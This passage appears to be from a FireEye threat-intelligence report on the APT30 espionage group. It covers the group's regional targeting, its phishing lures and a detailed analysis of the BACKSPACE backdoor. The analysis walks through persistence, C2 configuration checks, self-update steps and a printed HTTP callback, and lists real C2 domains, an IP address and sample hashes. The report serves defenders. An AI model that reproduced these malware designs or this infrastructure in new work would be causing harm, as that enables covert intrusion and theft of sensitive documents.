selected files to the controller. 11 While those commands are not atypical for full-featured backdoors, some of the BACKSPACE commands are more specialized, returning file metadata (such as file name, size, attributes, and MAC times) to the controller. 12 Transmitting metadata allows BACKSPACE to send less data to the server and for the threat actor to determine, based on results, which files to select for uploading Œ both techniques result in less data transferred over the network, which is less likely to draw attention. SHIPSHAPE, SPACESHIP, and FLASHFLOOD are three separate pieces of malware with different functions that appear to be designed to work together to infect removable drives, spread to additional systems (including potentially air-gapped systems), and steal files of interest. The tools frequently reference (in the mutexes, events, and registry keys they use) the terms ﬁFlashﬂ (perhaps for ﬁflash driveﬂ), ﬁShipﬂ, ﬁShipTrﬂ, and ﬁShipUpﬂ, as though the tools were designed to ﬁshipﬂ data between computers and a removable drive. We identified one SPACESHIP variant that used the term ﬁLunDuﬂ where the term ﬁShipTrﬂ would normally appear. ﬁLunDuﬂ ( ) means ﬁferryﬂ in Chinese and the malware may be designed to ﬁferryﬂ stolen documents from an air-gapped network, to a removable drive, to an Internet-connected host where they can be removed by the attacker. In addition, the malware frequently uses the initials ﬁLDﬂ in several places, including the SHIPSHAPE version file ( ldupver.txt), the folder \\\\$LDDATA$\\\\ used by some versions of SPACESHIP to store stolen data, and the .ldf file extension on the encoded files containing stolen data.The three tools have separate but complimentary functions: 13SHIPSHAPE is designed to copy files from specific paths on a SHIPSHAPE-infected computer to a removable drive inserted into the host. SHIPSHAPE looks for existing files and folders on the removable drive and marks them as hidden. It then copies executable files to the removable drive, using the same names as the existing files and folders, but with an .exe extension. SHIPSHAPE modifies the host settings to hide file extensions, so the executables appear to be the original documents. When viewed in Windows Explorer, the contents of the removable drive appear normal: 18However, viewing the contents of the drive from the command line will show both sets of files: A user attempting to ﬁopenﬂ a document from the infected drive would execute a copy of the malware instead.SPACESHIP is believed to be the malware that is copied to a removable drive by SHIPSHAPE, presumably to transfer SPACESHIP to an air- gapped computer. SPACESHIP is designed to search a victim computer for specific files (based on file extension or last modified time). Files that match the search criteria are compressed, encoded, and copied to a specified location on the infected host. When a removable drive is inserted into the infected computer, the encoded files are copied from that location to the removable drive. FLASHFLOOD is responsible for copying files from an inserted removable drive to the hard drive of an infected computer, presumably to remove files transferred from the air-gapped system to an Internet-connected machine for removal from the victim network. FLASHFLOOD will scan both the infected system and any inserted removable drive for specific files (based on file extension or last modified time) and copy them to a specified location, using the same compression and encoding method as SPACESHIP. FLASHFLOOD may also log additional information about the victim host, including system information and data from the user™s Windows Address Book. especially documents that may be stored on air-gapped networks.Malicious files 19APT30™S TARGETS ALIGN with Chinese Government Interests and Focus on Southeast Asia APT30 has routinely set its sights on targets across Southeast Asia and India. We have observed APT30 target national governments, regionally based companies in ten industries, and members of the media who report on regional affairs and Chinese government issues. Based on APT30™s confirmed targets and their intended victims, the group™s interests appear to concentrate on Southeast Asia regional political, economic, and military issues, disputed territories, and topics related to the legitimacy of the Chinese Communist Party. This evidence leads us to believe that APT30 serves a government™s needs for intelligence about key government and industry entities in Southeast Asia and India.We used a variety of sources to understand APT30™s intended targets. Our sources include: APT30 malware alerts from FireEye customers, phishing decoy document content and intended recipients, over 200 APT30 malware samples, and APT30™s operational timing and infrastructure. We also noted that some 96% of the APT30 malware that we detected through our products attempted to compromise our clients located in East Asia. 1APT30 and the Mechanics of a Long-Running Cyber Espionage Operation SPECIAL REPORT IndiaSouth Korea Malaysia VietnamNepal Bhutan Philippines SingaporeIndonesia Brunei Myanmar LaosCambodia JapanThailand Saudi Arabia United StatesCountries with Confirmed APT 30 Targets Countries with Likely APT30 Targets 1APT30 and the Mechanics of a Long-Running Cyber Espionage Operation SPECIAL REPORT IndiaSouth Korea Malaysia VietnamNepal Bhutan Philippines SingaporeIndonesia Brunei Myanmar LaosCambodia JapanThailand Saudi Arabia United StatesCountries with Confirmed APT 30 Targets Countries with Likely APT30 Targets 1APT30 and the Mechanics of a Long-Running Cyber Espionage Operation SPECIAL REPORT IndiaSouth Korea Malaysia VietnamNepal Bhutan Philippines SingaporeIndonesia Brunei Myanmar LaosCambodia JapanThailand Saudi Arabia United StatesCountries with Confirmed APT 30 Targets Countries with Likely APT30 Targets 1APT30 and the Mechanics of a Long-Running Cyber Espionage Operation SPECIAL REPORT IndiaSouth Korea Malaysia VietnamNepal Bhutan Philippines SingaporeIndonesia Brunei Myanmar LaosCambodia JapanThailandSaudi Arabia United StatesCountries with Confirmed APT 30 Targets Countries with Likely APT30 Targets 1APT30 and the Mechanics of a Long-Running Cyber Espionage Operation SPECIAL REPORT IndiaSouth Korea Malaysia VietnamNepalBhutan Philippines SingaporeIndonesia Brunei Myanmar LaosCambodia JapanThailand Saudi Arabia United StatesCountries with Confirmed APT 30 Targets Countries with Likely APT30 Targets 1APT30 and the Mechanics of a Long-Running Cyber Espionage Operation SPECIAL REPORT IndiaSouth Korea Malaysia VietnamNepalBhutan Philippines SingaporeIndonesia Brunei Myanmar LaosCambodia JapanThailand Saudi Arabia United StatesCountries with Confirmed APT 30 Targets Countries with Likely APT30 Targets 20APT30 PURSUES MEMBERSof the Association of Southeast Asian Nations (ASEAN)The group expresses a distinct interest in organizations and governments associated with ASEAN, particularly so around the time of official ASEAN meetings. ASEAN is a major regional organization whose member states promote cooperation and collaboration on a range of political, economic, educational, and social issues. ASEAN currently consists of ten member states: Indonesia, Malaysia, the Philippines, Singapore, Thailand, Brunei, Vietnam, Laos, Myanmar, and Cambodia. ASEAN-THEMED INFRASTRUCTURE AND CUSTOMIZED TOOLS APT30 has registered ASEAN-themed domains for C2 and compiled data-stealing malware that appears to be specifically designed around ASEAN events. APT30 is most likely trying to compromise ASEAN members or associates to steal information that would provide insight into the region™s politics and economics. The domain aseanm.com, which appears to be designed to mimic ASEAN™s legitimate domain (www.asean.org) , was first registered in March 2010. FireEye identified over 100 BACKSPACE malware variants that use that domain for C2, with compile dates that align with significant events in the ASEAN community. The table below shows compile times for known BACKSPACE samples that use aseanm.com for C2 frequently align with ASEAN events: Event Date899f512f0451a0ba4398b41ed1ae5a6d compiled5 May 2011 6:35 e6035ec09025c1e349a7a0b3f41e90b1 compiled5 May 2011 6:35 18th ASEAN Summit, Jakarta, Indonesia 7Œ8 May 2011 36a6a33cb4a13739c789778d9dd137ac compiled9 May 2011 3:34 Seventh ASEAN Plus Three Labour Ministers Meeting (7th ALMM+3), Phnom Penh, Cambodia 1611 May 2012 572c9cd4388699347c0b2edb7c6f5e25 compiled11 May 2012 0:06f3c29a67a7b47e644e9d1a2a0516974e compiled11 May 2012 0:06Senior Officials from ASEAN and China meet on implementation of the Declaration on the Conduct of Parties on the East Sea (DOC) 17 24Œ25 June 2012afe8447990ecb9e1cd4086955b7db104 compiled26 June 2012 1:43b5546842e08950bc17a438d785b5a019 compiled26 June 2012 1:43ASEAN-India Commemorative Summit, New Delhi, India 1812Œ20 December 2012310a4a62ba3765cbf8e8bbb9f324c503 compiled20 December 2012 3:53Table 4: ASEAN events and compile times for BACKSPACE samples using aseanm.com, 2011 - 2012 21A large number of recent BACKSPACE samples helps bolster our assessment that the malware was compiled for use in campaigns centered on major ASEAN issues. 87 more recent BACKSPACE samples using the C2 domain aseanm.com were compiled clustered around a handful of dates in January and April 2013. 35 samples were compiled on December 31, 2012 and January 4 and 5, 2013; on January 1, 2013, a new Secretary-General of ASEAN, Le Luong Minh, took office for his five-year term. 19 20 Similarly, 61 samples were compiled on April 22 and 23, 2013; the 22nd ASEAN Summit took place in Brunei on April 24 Œ 25, 2013.CUSTOMIZED MALWARE DEPLOYED AROUND ASEAN SUMMITS IN JANUARY AND APRIL 2013 Threat actors™ customization of malware can be a good indication of their level of intent on gaining access to a given target; it shows the actors have put a concerted effort into their targeting attempts, instead of taking a widespread ﬁspray and prayﬂ approach. APT30 deployed customized malware for use in specific campaigns targeting ASEAN members or nations with close ties or interests aligned with ASEAN states in January 2013 and April 2013.APT30 created the custom BACKSPACE ﬁZJ Autoﬂ (mutex MicrosoftZjAuto), ﬁZJ Linkﬂ (mutex MicrosoftZjLnk), and ﬁZJ Listenﬂ (mutex ZjListenLnk) variants. These malware samples were customized in two ways: (1) tailored URLs in BACKSPACE C2 communications that may represent ASEAN country codes, and (2) custom data theft and communication functions.Tailored URLs One of the customizations was in the specific URLs used for BACKSPACE C2 communications. BACKSPACE uses HTTP for much of its C2, retrieving various files from the first-stage C2 server, each of which may contain additional instructions for the malware. The C2 URL format is typically http://<c2_domain>/<path>/<file>, where <c2_domain> is the first-stage C2 location, <path> is a directory name that may vary across samples, and <filename> is the file to be downloaded (e.g., dizhi.gif).The <path> names used in the BACKSPACE samples from January and April 2013 may indicate the country of origin for the malware™s intended victims (red added for emphasis) on the table below:Table 5: Possible targets of 2013 BACKSPACE campaigns BACKSPACE Variant Path Possible Target ZJ Auto (version 1.4) /autoIN/IndiaZJ Auto (version 1.4) /autoMM/MyanmarZJ Auto (version 1.4) /autoSA/unknownZJ Auto (version 1.4) /autoTH/ThailandZJ Link (version F2.2LnkN / F2.3LnkN) /Forward-mci/Singapore ZJ Link (version F2.2LnkN / F2.3LnkN) /Forward-ph/PhilippinesZJ Link (version F2.2LnkN / F2.3LnkN) /Forward-SA/unknownZJ Link (version F2.2LnkN / F2.3LnkN) /Forward-th/ThailandZJ Link (version F2.2LnkN / F2.3LnkN) /Forward-yw1/unknownZJ Listen (versions Lan2.2LnkN, Lan2.2LnkY) /Forward-mci/SingaporeZJ Listen (versions Lan2.2LnkN, Lan2.2LnkY) /Forward-ph/PhilippinesZJ Listen (version Lan2.2LnkY) /Forward-SA/unknownZJ Listen (version Lan2.2LnkY) /Forward-th/ThailandZJ Listen (versions Lan2.2LnkN, Lan2.2LnkY) /Forward-yw1/unknown 22Customized Malware Supporting Data Theft The only identified BACKSPACE ﬁZJ Autoﬂ variants were all compiled on January 4 and 5, 2013 and appear to be unique to that campaign. This variant of BACKSPACE incorporated two additional features of note. First, ﬁZJ Autoﬂ will search a set of specified file paths for files of interest, and upload the list of files found to the second-stage C2 server: Ł %WINDIR%\\\\$NtUninstallKB900727$22 Ł %WINDIR%\\\\$NtUninstallKB885884$Ł <CSIDL_PROGRAMS>\\\\Outlook Express\\\\dataŁ <CSIDL_COMMON_PROGRAMS>\\\\Outlook Express\\\\dataŁ custom paths specified in the file path.iniIn addition, the ﬁZJ Autoﬂ variant of BACKSPACE incorporated the custom command ﬁ{ﬂ ( 0x7B). When the malware receives this command from the controller, it will upload any files located in the specified paths to the second-stage C2 server and then delete them from the local drive. Similarly, the ﬁZJ Linkﬂ variants were almost all compiled in either January 2013 or April 2013,23 and also appear to be largely unique to those campaigns. The ﬁZJ Linkﬂ variants added the commands ﬁ^ﬂ (0x5E) and ﬁ(ﬁ (0x28). ﬁ^ﬂ downloads a file to the special directory CSIDL_TEMPLATES24 and renames the file. ﬁ(ﬁ checks that the ﬁZJ Linkﬂ-infected computer can communicate with a specified host25 on ports 21, 80, and 443. ﬁZJ Linkﬂ appears to be designed to work on concert with another unique variant, ﬁZJ Listenﬂ. 26 ﬁZJ Listenﬂ variants listen for inbound connections on those same ports (21, 80, and 443); it is the only variant identified to date designed to receive C2 commands from an external source, as opposed to establishing an outbound connection to a C2 server. ﬁZJ Listenﬂ could be installed on an isolated LAN with no direct Internet connectivity, while ﬁZJ Linkﬂ could be installed on a normal, Internet-accessible computer. ﬁZJ Linkﬂ can accept standard commands from the BACKSPACE second-stage C2 server, and relay commands and responses to the ﬁZJ Listenﬂ-infected computer on the isolated network. 23SOCIAL ENGINEERING Consistently Includes Regional Security and Political Themes Many of APT30™s decoy documents use topics related to Southeast Asia, India, border areas, and broader security and diplomatic issues. Decoy documents attached to spear phishing emails are frequently indicators of intended targeting because threat actors generally tailor these emails to entice their intended targets Šwho typically work on related issuesŠto click on the attachments and infect themselves. APT30 LEVERAGES MAJOR POLITICAL TRANSITION AS PHISHING LURE CONTENT IN CAMPAIGN GEARED TO KEY POLITICAL STAKEHOLDERS In late summer 2014, FireEye detected an APT30 spear phishing campaign at one of our regional customers. The decoy document topic related to a significant political transition in Southeast Asia. The phishing email, which contained a backdoor compiled the day prior, was likely an attempt to gain access to targets that would give APT30 actors insight into the level of instability and pending changes in the country™s political leadership. Such information is typically a high priority for a government™s intelligence collection efforts. According to the spear phishing emails™ recipients list, the email was sent to over thirty recipients in the country™s Financial Services, Government and Defense sectors. APT30 targeted both professional and personal (Gmail, Hotmail) email accounts. The email was crafted entirely in the country™s language, and the message™s subject translated to ﬁforeign journalists™ reactions to the political transition.ﬂ This topic would likely be of interest to individuals in security roles, leadership positions, diplomatic jobs, or public or press-facing roles. The spear phishing email was either sent from a compromised email account of one of the country™s governmental agencies or was convincingly spoofed to look as though it originated from that agency. REPEATED DECOY SUBJECTS ON INDIA- CHINA MILITARY RELATIONS AND CONTESTED REGIONSAPT30 appears to use decoy documents about China™s relationship with India, particularly their military relations, likely in an attempt to compromise targets with information about this bilateral relationship. APT30 leveraged the text of a legitimate academic journal on China™s border security challenges in one of its decoy documents. 24Similarly, several of APT30™s decoy themes have centered on Indian defense and military materiel topics. In particular, a number of spear phishing subjects have related to Indian aircraft carrier and oceanographic monitoring processes, which probably indicates a specific interest in naval and maritime themes around Indian military activity and disputes in the South China Sea. The decoy document depicted in Figure 20 correlates to the actual building and launch of India™s first Indian- built aircraft carrier. Decoy documents are not the only evidence of APT30™s targeting of Indian organizations. India-based users of VirusTotal have submitted APT30 malware to the service, suggesting that Indian researchers discovered APT30™s suspicious activity at Indian organizations as well. FireEye has also identified alerts from APT30 malware at India-based customers including:Ł An Indian aerospace and defense company Ł An Indian telecommunications firmAnother recurring theme in APT30™s decoy documents relates to regionally contested territories, including Bhutan and Nepal. Nepal and Bhutan are important buffer states in China-India border conflicts and represent an opportunity to assert regional military dominance in Asia.Several decoy themes center on Indian defense and military materiel topics. 25The decoy document depicted in Figure 21 correlates to August 2013™s 21st Round of Boundary Talks between Bhutan and China. This text was taken verbatim from press release put out by Bhutan™s Ministry of Foreign Affairs. 27 Nepal is also a key battleground for influence between China and India and serves a theme in APT30 decoy documents. Traditionally Nepal has rested securely in India™s sphere of influence, but more recently, China has become a more influential player with large investments in infrastructure projects, increased funding to the military and police, and other traditional Chinese influence efforts (for example, establishing Confucius Institutes). Beyond the ongoing border tensions, Nepal is also strategic to both India and China for its significant water resources. The decoy document below depicts a Nepal-related APT30 phishing decoy document. between China and India, and serves a theme in APT30 decoy documents. APT30 and the Mechanics of a Long-Running Cyber Espionage Operation SPECIAL REPORT 26In addition to APT30™s Southeast Asia and India focus, we™ve observed APT30 target journalists reporting on issues traditionally considered to be focal points for the Chinese Communist Party™s sense of legitimacy, such as corruption, the economy, and human rights. In China, the Communist Party has the ultimate authority over the government. China-based threat groups have targeted journalists before; we believe they often do so to get a better understanding on developing stories to anticipate unfavorable coverage and better position themselves to shape public messaging. A FireEye as a Service customer in the media industry received a spear phishing message in October 2012 with a subject line of ﬁChina MFA Press Briefing 29 October 2012- Full Transcript.ﬂ APT30 sent this message to over fifty other journalists of major global news outlets, including both official work accounts and personal email accounts. Overall, the themes on which the journalists reported fell into the following categories 1 through 6, in rough order of prevalence. APT30™s attempts to compromise journalists and media outlets could also be used to punish outlets that do not provide favorable coverage Œ for example, both the New York Times and Bloomberg have had trouble securing visas for journalists in wake of unfavorable corruption reporting. 28 Beyond targeting, we also saw summaries of media events or reporting in decoy documents, particularly around press releases related to government or military updates. It appears that APT30 could plausibly be targeting press attachés in order to obtain access to their contacts, which would presumably include the contact information of other public affairs personnel or other journalists of interest to target. Targeting press attachés would enable APT30 to target journalists from a trusted source, which would be an excellent resource for spear phishing.

They appear to consider both the timing of their operations and prioritize their targets. Some of the their tools™ capabilities, most notably the ability to infect air gapped networks, suggest both a level of planning and interest in particularly sensitive data, such as that housed on government networks. The group™s method for selecting and tracking victims suggests a high level of coordination and organization among the group™s operators. With activity spanning more than ten years, APT30 is one of the longest operating threat groups that we have encountered and one of the few with a distinct regional targeting preference.Our research into APT30 demonstrates what many already suspected: threat actors rely on cyber capabilities to gather information about their immediate neighborhood, as well as on a larger, global scale. APT30 appears to focus not on stealing businesses™ valuable intellectual property or cutting-edge technologies, but on acquiring sensitive data about the immediate Southeast Asia region, where they pursue targets that pose a potential threat to the influence and legitimacy of the Chinese Communist Party. In exposing APT30, we hope to increase organizations™ awareness of threats and ability to defend themselves. APT30™s targeting interests underscore the need for organizations across the region to defend the information assets valuable to determined threat actors.Full indicators associated with APT30 are available at https://github.com/fireeye/iocs/ 29APPENDIX A Detailed Malware AnalysisBACKDOORS Despite their long history of operations, APT30 has primarily relied on a two backdoors to support their activity: BACKSPACE 29 and NETEAGLE. Both backdoors have evolved into a number of variants. BACKSPACE has diverged into two main branches (ﬁZJﬂ and ﬁZRﬂ) with numerous variations throughout each branch. Similarly, NETEAGLE has two main versions, ﬁScoutﬂ and ﬁNortonﬂ, with Norton being the later (more recent) version. The two backdoors differ widely in their development features, including differing programming languages and different sets of commands supported by each. Despite this, the two also share some high-level design similarities, including update features and the use of two- stage command and control infrastructures. The following table highlights some of the similarities and differences between the two families.30 Table 6: Comparison of BACKSPACE and NETEAGLE backdoors BACKSPACE NETEAGLE Development language CC++, MFCMutex Differs across variants, but uses similar naming convention, e.g. MicrosoftZj, MicrosoftZJLnk, MicrosoftForZR, etc.NetEagle_Scout, Eagle-Norton360-OfficeScan C2 DomainsSamples may use up to four C2 domains, for configuration retrieval, downloading updates, or as a backup domain if the primary fails.Samples use a single C2 domain.May Attempt to Bypass Host-Based FirewallYes (observed in some versions) No (not observed) Callback format (may vary per sample) GET /ForZRLnk1z/dizhi.gif HTTP/1.0 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)HOST: www.km153.com:80 GET /update1/pic1.bmp HTTP/1.1 User-Agent: name of malware binary Host: www.creammemory.com Second stage C2Downloads configuration file dizhi.gif from first stage C2 URLDownloads configuration file pic1.bmp from first stage C2 URLConnect to second stage controllerDownloads connect.gif from first stage C2.

Variants of this branch are still being developed and compiled, adding a broad range of supported commands while still retaining the core functionality of the original versions. The BACKSPACE variant 8c713117af4ca6bbd69292a78069e75b was compiled on August 26, 2014. It represents one member of the ﬁZJﬂ branch of the BACKSPACE malware family. Initial Execution The mutex MicrosoftZjSYNoReg is used to guarantee that only one instance of the malware is running at any time. BACKSPACE also creates two events ( MicrosoftSYNoRegExit, MicrosoftSYNoRegHaveExit) that, when signaled, trigger all the threads and the malware itself to exit. A third event, MicrosoftSYNoRegHaveAck, is created to be used by the malware to synchronize the processing of a task with an acknowledgement received from the C2 server. The malware extracts system information (OS version, build number, platform, service pack, default language id) and proxy information (from the ProxyEnable and ProxyServer values under HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\) from the victim host.BACKSPACE then creates the registry values lnk (type REG_SZ) and hostid (type REG_DWORD) under the HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\CurrentHalInf registry key: Ł lnk is set NTO/mol which is the encoded 31 text MSN.lnk.Ł hostid is set to a random value that is used to uniquely identify the victim computer. The malware creates a copy of itself in the folder <CSIDL_PROGRAMS>\\\\Messenger\\\\BIN as msmsgs.exe, creating the folder if necessary. For persistence, BACKSPACE creates the Windows shortcut file MSN.lnk in <CSIDL_STARTUP> pointing to <CSIDL_PROGRAMS>\\\\Messenger\\\\BIN\\\\msmsgs.exe with the description \"Windows Messenger\". C2 DomainsLike many BACKSPACE variants, this sample is configured with four different C2 domains. The C2 domains are used in HTTP requests for various files; each file requested via the URI provides additional instructions or data to the malware. BACKSPACE C2 domains are typically used for different purposes Œ that is, each domain is associated with different URIs whose associated files support different functions. For this sample, the four C2 domains have the following roles: Table 7: BACKSPACE C2 domains and registration dates AliasC2 DomainDescriptionZone Registration Date D1www.iapfreecenter.comPrimary C2 domain5/23/2014D2www.appsecnic.comBackup C2 domain; run/hide configuration 3/15/2010D3www.newpresses.comRun/hide configuration 3/17/2010D4www.km153.comRun/hide configuration 8/30/2007 31ﬁRunﬂ vs ﬁHideﬂ Mode BACKSPACE reads the registry value hFlag under HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\CurrentHalInf. If it exists and is set to 1 the malware switches to \"Run Mode\"; otherwise the malware operates in \"Hidden Mode\". To switch to ﬁRun modeﬂ, BACKSPACE attempts to contact its C2 servers for validation and to obtain configuration data (stored in a file named nur.txt). It parses the configuration data and performs a series of increasingly generic checks to see whether (by inclusion or exclusion) it should remain in ﬁRun modeﬂ: 1. Make an HTTP request to www.iapfreecenter.com/Lnk1z/hostlist.txt and validate that the last byte of the response is 0xFE.2. Make an HTTP request to the legitimate URL automation.whatismyip.com/n09230945.asp to obtain the external IP of the victim computer. 3. Make an HTTP request to either www.newpresses.com/http/nur.txt, www.km153.com/http/nur.txt or www.appsecnic.com/http/nur.txt and validate that the response starts with \"abcd1234\"; if none of the servers respond accordingly, setting \"Run Mode\" fails.4. If the response from the server contains the \"r unhost=\" option, search for the victim computer™s hostname in the option data. If found, setting \"Run Mode\" succeeds; else go to step 5. 5. If the response from the server contains the \" runhostexcept=\" option, search for the victim computer™s hostname in the option data. If found, setting \"Run Mode\" fails; else go to step 6. 6. If the response from the server contains the \" runip=\" option, search for the victim computer™s external IP (obtained in step 2) in the option data. If found, setting \"Run Mode\" succeeds ; else go to step 7.7. If the response from the server contains the \" runipexcept=\" option, search for the victim computer™s external IP (obtained in step 2) in the option data. If found, setting \"Run Mode\" fails; else go to step 8. 8. If the response from the server contains the \" rundir=\" option, search for the current C2 URL (e.g., www.iapfreecenter.com/Lnk1z) in the option data. If found, setting \"Run Mode\" succeeds ; else go to step 9.9. If the response from the server contains the \" rundirexcept=\" option, search for the current C2 URL (e.g., www.iapfreecenter.com/Lnk1z) in the option data. If found, setting \"Run Mode\" fails; else go to step 10.10. If the response from the server contains the \" runweb=\" option, search for the current C2 domain (e.g., www.iapfreecenter.com) in the option data. If found, setting \"Run Mode\" succeeds ; else go to step 11.11. If the response from the server contains the \" runwebexcept=\" option, search for the current C2 domain (e.g., www.iapfreecenter.com) in the option data. If found, setting \"Run Mode\" fails; else go to step 12.12. If the response from the server contains the \" runall=1\" option, setting \"Run Mode\" succeeds . 32If switching to \"Run Mode\" fails, BACKSPACE reads the registry value PassPath under HKEY_CURRENT_ USER\\\\Software\\\\Microsoft\\\\CurrentHalInf, attempts to terminate the process identified by the registry data, and then exits. If BACKSPACE successfully switches to \"Run Mode\", the hFlag registry value under HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\CurrentHalInf is deleted. The victim computer™s hostname and IP are saved. A thread to switch the malware back to \"Hidden Mode\" is started. The thread runs indefinitely until the MicrosoftSYNoRegExit event gets signaled; once signaled, the thread signals the MicrosoftSYNoRegHaveExit event. In this thread, the malware reads the registry value PassPath under HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\CurrentHalInf, attempts to terminate the process identified by the registry data, and then exits. Similar to switching to ﬁRun modeﬂ BACKSPACE conducts a series of checks to attempt to switch to \"Hidden Mode\": 1. Make an HTTP request to www.iapfreecenter.com/Lnk1z/hostlist.txt and validate that the last byte of the response is 0xFF.2. Make an HTTP request to the legitimate URL a utomation.whatismyip.com/n09230945.asp to obtain the external IP of the victim computer. 3. Make an HTTP request to either www.newpresses.com/some/edih.txt, www.km153.com/some/edih.txt or www.appsecnic.com/some/edih.txt and validate that the response starts with \"abcd1234\"; if none of the servers respond accordingly, setting \"Hidden Mode\" fails.4. If the response from the server contains the \" killpath=\" option, write the option data to the registry value PassPath under HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\CurrentHalInf; this data represents the path of a process to be terminated.5. If the response from the server contains the \" hidehost=\" option, search for the victim computer™s hostname in the option data. If found, setting \"Hidden Mode\" succeeds ; else go to step 5. 6. If the response from the server contains the \" hidehostexcept=\" option, search for the victim computer™s hostname in the option data. If found, setting \"Hidden Mode\" fails; else go to step 6. 7. If the response from the server contains the \" hideip=\" option, search for the victim computer™s external IP (obtained in step 2) in the option data. If found, setting \"Hidden Mode\" succeeds ; else go to step 7.8. If the response from the server contains the \" hideipexcept=\" option, search for the victim computer™s external IP (obtained in step 2) in the option data. If found, setting \"Hidden Mode\" fails; else go to step 8.9. If the response from the server contains the \" hidedir=\" option, search for the current C2 URL (e.g., www.iapfreecenter.com/Lnk1z or www.appsecnic.com/Lnk1z) in the option data. If found, setting \"Hidden Mode\" succeeds; else go to step 9.10. If the response from the server contains the \" hidedirexcept=\" option, search for the current C2 URL in the option data. If found, setting \"Hidden Mode\" fails; else go to step 10. 3311. If the response from the server contains the \" hideweb=\" option, search for the current C2 domain (e.g., www.iapfreecenter.com or www.appsecnic.com) in the option data. If found, setting \"Hidden Mode\" succeeds; else go to step 11.12. If the response from the server contains the \" hidewebexcept=\" option, search for the current C2 domain in the option data. If found, setting ﬁHidden Mode\" fails; else go to step 12. 13. If the response from the server contains the \"hideall=1\" option, setting \"Hidden Mode\" succeeds .If BACKSPACE successfully switches to \"Hidden Mode\" succeeds, the hFlag registry value under HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\CurrentHalInf is created and set to 1.The malware stores the hostname of the victim computer™s primary Domain Controller to be sent to the second stage C2 server as part of the host details data. Primary vs Backup C2 DomainsBACKSPACE sends an HTTP request to www.appsecnic.com/Lnk1z/bak.txt. If the response starts with \"qazWSX123$%^\", it sets the primary C2 URL domain to www.appsecnic.com. Download Additional FilesBACKSPACE sends an HTTP request to the primary C2 URL domain and URL path /Lnk1z/app.txt and saves the file to <CSIDL_PROGRAMS>\\\\Messenger\\\\BIN\\\\Temp.txt. Next, the downloaded file is copied to <CSIDL_PROGRAMS>\\\\Messenger\\\\BIN as MessengerPlug.exe and if it is a valid PE file, a new process is started.In addition, BACKSPACE sends an HTTP request to the primary C2 URL domain and URL path /Lnk1z/hostlist.txt. If the victim computer™s hostname is found in the response, BACKSPACE makes a new HTTP request to the primary C2 URL domain and URL path /Lnk1z/myapp.txt and saves the file to <CSIDL_PROGRAMS>\\\\Messenger\\\\BIN\\\\Temp.txt. Next, the downloaded file is copied to < CSIDL_PROGRAMS>\\\\Messenger\\\\BIN as MessengerForVista.exe and if it is a valid PE file, a new process is started.BACKSPACE will then delete the following files: Ł <CSIDL_PROGRAMS>\\\\Messenger\\\\BIN\\\\Temp.txtŁ <CSIDL_PROGRAMS>\\\\Messenger\\\\BIN\\\\UpdateMessenger.exeŁ <CSIDL_PROGRAMS>\\\\Messenger\\\\BIN\\\\MessengerPlug.exeŁ <CSIDL_PROGRAMS>\\\\Messenger\\\\BIN\\\\MessengerForVista.exeSelf-Update MechanismBACKSPACE performs the following update tasks: 1. Obtain the latest available version number by making an HTTP to request to the primary C2 URL domain and URL path /Lnk1z/ver.txt; if the version returned does not match the version of the current binary (\"2.00MSNN\" for this sample), go to step 2. 2. Download a new binary by making an HTTP request to the primary C2 URL domain and URL path /Lnk1z/exe.txt and saving the file to <CSIDL_PROGRAMS>\\\\Messenger\\\\BIN\\\\Temp.txt.3. Copy <CSIDL_PROGRAMS>\\\\Messenger\\\\BIN\\\\Temp.txt to <CSIDL_PROGRAMS>\\\\Messenger\\\\BIN as UpdateMessenger.exe. 344. If <CSIDL_PROGRAMS>\\\\Messenger\\\\BIN\\\\UpdateMessenger.exe is a valid PE, start a new process. If the previous update task fails, BACKSPACE performs a new update task: 1. Obtain the latest available version number by making an HTTP to request to the primary C2 URL domain and URL path /Lnk1z/SomeUpVer.txt; if the version returned does not match the version of the current binary, go to step 2. 2. Make an HTTP request to the primary C2 URL domain and URL path /Lnk1z/SomeUpList.txt and validate that the victim computer™s host name is in the response; if true, go to step 3. 3. Download a new binary by making an HTTP request to the primary C2 URL domain and URL path /Lnk1z/SomeUpExe.txt and saving the file to <CSIDL_PROGRAMS>\\\\Messenger\\\\BIN\\\\Temp.txt.4. Copy <CSIDL_PROGRAMS>\\\\Messenger\\\\BIN\\\\Temp.txt to <CSIDL_PROGRAMS>\\\\Messenger\\\\BIN as UpdateMessenger.exe.5. If <CSIDL_PROGRAMS>\\\\Messenger\\\\BIN\\\\UpdateMessenger.exe is a valid PE, start a new process. Second Stage C2 Server Next, BACKSPACE makes an HTTP request to the primary C2 URL domain and URL path /Lnk1z/dizhi.gif. Dizhi.gif is a 10-byte configuration file that specifies an IP address and three port numbers. BACKSPACE starts a new thread to send details about the victim computer (ComputerName, IP, SystemDetails, DefaultLangID, HostID, Proxy info, malware current version, malware current domain, and information about the logical drives) to Port1 on the new C2 server. The malware will use the victim computer™s saved proxy settings if needed. The data is sent using an HTTP POST request to the URL path /index.htm.BACKSPACE also attempts to retrieve the URL path /ForZRLnk3z/connect.gif from the primary C2 URL domain. If the victim computer™s hostname and hostid are found in the file, the victim will attempt to establish a connection to the second stage C2 server on Port2 to allow the threat actors to directly interact with the victim via the BACKSPACE controller. After establishing the connection to the controller, BACKSPACE awaits further interactive commands from the operator. For this copy of BACKSPACE, the following commands are supported: IP: 112.117.9.222 Port1: 443 Port2: 443 Port3:82 35Table 8: Commands supported by BACKSPACE \"ZJ\" variant 8c713117af4ca6bbd69292a78069e75b CommandMeaningASame as J or S, but the file is deleted from the victim computer after transmission.

